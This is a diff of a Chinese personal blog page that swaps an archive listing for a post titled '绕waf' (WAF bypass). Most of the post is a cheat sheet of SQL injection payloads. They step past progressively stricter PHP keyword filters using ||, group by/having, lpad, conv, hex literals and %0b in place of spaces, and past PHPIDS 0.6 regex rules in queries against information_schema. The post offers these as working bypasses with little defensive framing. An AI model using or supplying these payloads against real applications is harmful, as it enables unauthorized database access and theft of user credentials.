@@ -7,13 +7,17 @@
 
     
 
-    <title>归档：2017/9 | 月尚の博客</title>
+    <title>绕waf | 月尚の博客</title>
     
+    
+    <meta name="description" content="关键词过滤：and,orPHP过滤代码：preg_match(‘/(and|or)/I’,$id)
+过滤注入： 1 or 1 = 1    1 and 1 = 1绕过注入：1 || 1 = 1    1 &amp;amp;&amp;amp; 1 = 1
+关键词过滤：and,or,unionPHP过滤代码：preg_">
     
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    
+    <meta property="og:title" content="绕waf"/>
     <meta property="og:site_name" content="月尚の技术小屋"/>
 
     
@@ -255,40 +259,103 @@
 
     <main>
         <div class="container main-container">
-    
-
-<nav class="page-nav hide-on-small-only">
+    <nav class="page-nav hide-on-small-only">
     <div class="nav-wrapper indigo">
-        <span class="breadcrumb">当前位置（归档）</span>
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/未分类/">未分类</a>
+
+
         
 
         
     </div>
 </nav>
 
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>绕waf</h1>
+    
 
 
-    <ul class="collapsible mt-0" data-collapsible="accordion">
+            </div>
+            <time class="pink-link-context" datetime="2019-06-26T16:00:00.000Z"><a href="/2019/06/27/绕waf/">2019-06-27</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
         
+            <a href="/tags/标签/" class="chip pink lighten-1">标签</a>
         
-            <li>
-                <div class="collapsible-header active">
-                    <i class="fa fa-archive"></i>2017
-                </div>
-                <div class="collapsible-body">
-                    <div class="collection">
-                        
-                            <a href="/2017/09/10/在CentOS上搭建Seafile网盘/" class="collection-item grey-text text-darken-1">
-                                <time datetime="2017-09-09T16:00:00.000Z">2017-09-10</time>
-                                <span>&nbsp;&nbsp;&nbsp;</span>
-                                在CentOS上搭建Seafile网盘
-                            </a>
-                        
-                    </div>
-                </div>
-            </li>
-        
-    </ul>
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or"><span class="section table-of-contents-text">关键词过滤：and,or</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or-union"><span class="section table-of-contents-text">关键词过滤：and,or,union</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or-union-where"><span class="section table-of-contents-text">关键词过滤：and,or,union,where</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or-union-where-limit"><span class="section table-of-contents-text">关键词过滤：and,or,union,where,limit</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or-union-where-limit-group-by"><span class="section table-of-contents-text">关键词过滤：and,or,union,where,limit,group by</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or-union-where-limit-group-by-select-’"><span class="section table-of-contents-text">关键词过滤：and,or,union,where,limit,group by,select,’</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or-union-where-limit-goup-by-select-’-hex"><span class="section table-of-contents-text">关键词过滤：and,or,union,where,limit,goup by,select,’,hex,</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or-union-where-limit-group-by-select-’-hex-substr"><span class="section table-of-contents-text">关键词过滤：and,or,union,where,limit,group by,select,’,hex,substr</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#关键词过滤：and-or-union-where-limit-group-by-select-’-hex-substr-white-space"><span class="section table-of-contents-text">关键词过滤：and,or,union,where,limit,group by,select,’,hex,substr,white space</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#绕过正则表达式过滤"><span class="section table-of-contents-text">绕过正则表达式过滤</span></a>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <h2 id="关键词过滤：and-or"><a href="#关键词过滤：and-or" class="headerlink" title="关键词过滤：and,or"></a>关键词过滤：and,or</h2><p>PHP过滤代码：preg_match(‘/(and|or)/I’,$id)</p>
+<p>过滤注入： 1 or 1 = 1    1 and 1 = 1<br>绕过注入：1 || 1 = 1    1 &amp;&amp; 1 = 1</p>
+<h2 id="关键词过滤：and-or-union"><a href="#关键词过滤：and-or-union" class="headerlink" title="关键词过滤：and,or,union"></a>关键词过滤：and,or,union</h2><p>PHP过滤代码：preg_match (‘/(and|or|union)/I’,$id)</p>
+<p>过滤注入：union  select  user, password  from  users<br>绕过注入：1 || （select  user  from  users  where  user_id = 1）=’admin’</p>
+<p>注意：你必须知道表名，列名和一些表中的其他数据，否则你必须用别的语句从information_schema.columns中获取。<br>举例，使用substring函数获取表名的每一个字符。</p>
+<h2 id="关键词过滤：and-or-union-where"><a href="#关键词过滤：and-or-union-where" class="headerlink" title="关键词过滤：and,or,union,where"></a>关键词过滤：and,or,union,where</h2><p>PHP过滤代码：preg_match(‘/(and|or|union|where)/I’,$id)</p>
+<p>过滤注入：1||（select  user  from  users  where  user_id = 1）= ‘admin’<br>绕过注入：1||( select  user  from  users  limit  1)=’admin’</p>
+<h2 id="关键词过滤：and-or-union-where-limit"><a href="#关键词过滤：and-or-union-where-limit" class="headerlink" title="关键词过滤：and,or,union,where,limit"></a>关键词过滤：and,or,union,where,limit</h2><p>PHP过滤代码：preg_match(‘/(and|or|union|where|limit)/I’,$id)</p>
+<p>过滤注入：1||（select  user  from  users  limit  1）=’admin’<br>绕过注入：1||（select  user  from  users  group by user_id having user_id=1 ）= ‘admin’</p>
+<h2 id="关键词过滤：and-or-union-where-limit-group-by"><a href="#关键词过滤：and-or-union-where-limit-group-by" class="headerlink" title="关键词过滤：and,or,union,where,limit,group by"></a>关键词过滤：and,or,union,where,limit,group by</h2><p>PHP过滤代码：preg_match(‘/(and|or|union|where|limit|group by)/I’,$id)</p>
+<p>过滤注入：1||（select  user  from  users  group  by  user_id  having  user_id  =1）=’admin’<br>绕过注入： 1||（select  substr(group_concat(user_id),1,1) user  from  users  )=1</p>
+<h2 id="关键词过滤：and-or-union-where-limit-group-by-select-’"><a href="#关键词过滤：and-or-union-where-limit-group-by-select-’" class="headerlink" title="关键词过滤：and,or,union,where,limit,group by,select,’"></a>关键词过滤：and,or,union,where,limit,group by,select,’</h2><p>PHP过滤代码：preg_match(‘/(and|or|union|where|limit|group by|select|\’)/I’,$id</p>
+<p>过滤注入： 1||（select substr(group_concat(usr_id),1,1)user from users =1<br>绕过注入：1|| user_id is not null<br>绕过注入：1||substr(user,1,1)=0×61<br>绕过注入：1||substr(user,1,1)=unhex(61)</p>
+<h2 id="关键词过滤：and-or-union-where-limit-goup-by-select-’-hex"><a href="#关键词过滤：and-or-union-where-limit-goup-by-select-’-hex" class="headerlink" title="关键词过滤：and,or,union,where,limit,goup by,select,’,hex,"></a>关键词过滤：and,or,union,where,limit,goup by,select,’,hex,</h2><p>PHP过滤代码：preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex)/I’,$id)</p>
+<p>过滤注入：1||substr(user,1,1)=unhex(61)<br>绕过注入：1||substr(user,1,1)=lower(conv(11,10,36))</p>
+<h2 id="关键词过滤：and-or-union-where-limit-group-by-select-’-hex-substr"><a href="#关键词过滤：and-or-union-where-limit-group-by-select-’-hex-substr" class="headerlink" title="关键词过滤：and,or,union,where,limit,group by,select,’,hex,substr"></a>关键词过滤：and,or,union,where,limit,group by,select,’,hex,substr</h2><p>PHP过滤代码：preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex|substr)/I’,$id)</p>
+<p>过滤注入：1||substr(user,1,1)=lower(conv(11,10,36))<br>绕过注入：1||lpad(user,7,1)</p>
+<h2 id="关键词过滤：and-or-union-where-limit-group-by-select-’-hex-substr-white-space"><a href="#关键词过滤：and-or-union-where-limit-group-by-select-’-hex-substr-white-space" class="headerlink" title="关键词过滤：and,or,union,where,limit,group by,select,’,hex,substr,white space"></a>关键词过滤：and,or,union,where,limit,group by,select,’,hex,substr,white space</h2><p>PHP过滤代码：preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex|substr|\s)/I’,$id)</p>
+<p>过滤注入：1||lpad(user,7,1)<br>绕过注入：1%0b||%0blpad(user,7,1)</p>
+<h1 id="绕过正则表达式过滤"><a href="#绕过正则表达式过滤" class="headerlink" title="绕过正则表达式过滤"></a>绕过正则表达式过滤</h1><p>正则表达式过滤是一个比关键词和函数过滤要好的阻止SQL注入的方法，因为它使用模式匹配来检测攻击。但是，很多正则表达式仍然能被绕过。下面以开源软件PHPIDS 0.6举例阐明用来绕过正则表达式的注入脚本。</p>
+<p>PHPIDS通常阻止包含=,（或者’ 跟随一个字符串或者整数输入，比如1 or 1=1，1 or ’1’，1 or  char(97)。但是，它能被使用不包含=，（或者’符号的语句绕过。</p>
+<p>过滤注入： 1 or 1 = 1<br>绕过注入： 1 or 1</p>
+<p>过滤注入： 1 union select 1, table_name from information_schema.tables where table_name=’users’</p>
+<p>过滤注入： 1 union select 1,table_name from information_schema.tables where table_name between ‘a’ and ‘z’</p>
+<p>过滤注入： 1 union select 1,table_name from information_schema.tables where table_name between char(97) and char(122)</p>
+<p>绕过注入： 1 union select 1,table_name from information_schema.tables where table_name between 0x61 and 0x7a</p>
+<p>绕过注入： 1 union select 1,table_name from information_schema.tables where table_name like 0x7573657273</p>
+
+                
+
+
+<p class="pink-link-context">
+    <a href="/2018/11/12/jetty简介/" rel="next" title="jetty简介">
+    下一篇：jetty简介
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+
+
 
 
 </div>
